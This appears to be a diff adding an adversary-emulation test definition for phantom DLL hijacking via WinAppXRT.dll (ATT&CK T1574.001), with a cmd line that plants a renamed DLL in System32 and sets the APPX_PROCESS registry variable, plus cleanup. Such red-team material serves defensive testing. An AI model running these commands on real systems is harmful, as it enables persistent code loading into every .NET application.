@@ -1,0 +1,25 @@
+---
+- id: 98bb48fb56cdd2a57dcb4f040ffb0ba9
+  name: Phantom Dll Hijacking - WinAppXRT.dll
+  description: ".NET components (a couple of DLLs loaded anytime .NET apps are executed)\
+    \ when they are loaded they look for an environment variable called APPX_PROCESS\n\
+    Setting the environmental variable and dropping the phantom WinAppXRT.dll in e.g.\
+    \ c:\\windows\\system32 (or any other location accessible via PATH) will ensure\
+    \ the \nWinAppXRT.dll is loaded everytime user launches an application using .NET.\n\
+    \nUpon successful execution, amsi.dll will be copied and renamed to WinAppXRT.dll\
+    \ and then WinAppXRT.dll will be copied to system32 folder for loading during\
+    \ execution of any .NET application.\n"
+  tactic: multiple
+  technique:
+    attack_id: T1574.001
+    name: 'Hijack Execution Flow: DLL'
+  platforms:
+    windows:
+      cmd:
+        command: copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll && ren %APPDATA%\amsi.dll
+          WinAppXRT.dll && copy %APPDATA%\WinAppXRT.dll %windir%\System32\WinAppXRT.dll
+          && reg add "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /t REG_EXPAND_SZ
+          /d "1" /f
+        payloads: []
+        cleanup: reg delete "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /f &&
+          del %windir%\System32\WinAppXRT.dll && del %APPDATA%\WinAppXRT.dll
